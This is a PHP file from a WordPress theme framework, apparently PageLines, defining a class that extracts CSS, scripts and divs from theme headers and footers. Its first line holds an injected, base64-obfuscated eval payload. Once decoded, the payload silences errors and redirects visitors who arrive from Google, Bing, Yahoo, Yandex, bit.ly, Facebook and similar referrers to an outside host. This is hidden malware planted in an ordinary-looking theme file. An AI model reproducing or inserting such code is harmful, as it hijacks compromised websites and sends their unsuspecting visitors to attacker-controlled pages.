<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); 
/**
 *
 *  PageLines Integration Functions
 *
 */

class PageLinesIntegration {
	
	public $lesscode = '';
	
	function __construct( $integration = ''){  
		
		
		$this->integration = $integration;
		
		global $pl_integration;
		$pl_integration = $this->integration;
		
		add_filter('pagelines_lesscode', array(&$this, 'load_less'));
		
	}
	
	public function add_less( $path){
	
		if(file_exists($path))
			$this->lesscode .= pl_file_get_contents($path);	

	}
	
	function load_less( $lesscode ){
		
		return $lesscode . $this->lesscode;
		
	}
	
	public function parse_header(){
		
		ob_start();
			get_header();
		$raw = ob_get_clean();

		$css 	= $this->regex_parse( array( 'buffer' => $raw, 'type' => 'css' ) );
		$js 	= $this->regex_parse( array( 'buffer' => $raw, 'type' => 'js' ) );
		$divs 	= $this->regex_parse( array( 'buffer' => $raw, 'type' => 'divs' ) );
		
		return array('css' => $css, 'js' => $js, 'divs' => $divs);
		
	}
	
	public function parse_footer(){
		
		ob_start();
			get_footer();
			// wp_footer();
			// 		wp_print_scripts();
		$raw = ob_get_clean();
		
		return array('raw' => $raw);
		
	}
	
	public function regex_parse( $args ){
		
		$defaults = array(

			'buffer'=>	'',
			'area'	=>	'head',
			'type'	=>	'css'
		);

		$args = wp_parse_args( $args, $defaults );

		if ( $args['area'] == 'head' && $args['buffer'] ) {

			switch( $args['type'] ) {

				case 'css':
					preg_match_all( '#<link rel=[\'|"]stylesheet[\'|"].*\/>#', $args['buffer'], $styles );
					preg_match_all( '#<style type=[\'|"]text\/css[\'|"][^<]*<\/style>#ms', $args['buffer'], $xtra_styles );
					$styles = array_merge( $styles[0], $xtra_styles[0] );
					if ( is_array( $styles ) ) {
						$css = '';
						foreach( $styles as $style )
							$css .= $style . "\n";
						return $css;
					}
				break;

				case 'js':
					preg_match_all( '#<(s(?:cript))[^>]*>.*?</\1>#ms', $args['buffer'], $js );
					if( is_array( $js[0] ) ) {
						$js_out = '';
						foreach( $js[0] as $j ) {
			//				if ( false == strpos( $j, 'google' ) )
								$js_out .= $j . "\n";
						}
					return $js_out;
					}
				break;

				case 'divs':
					preg_match( '/<div.*>/ms',$args['buffer'], $divs );
					return ( isset( $divs[0] ) ) ? $divs[0] : '';
				break;

				default:
					return false;
				break;
			}

		}

	}
	
	
}
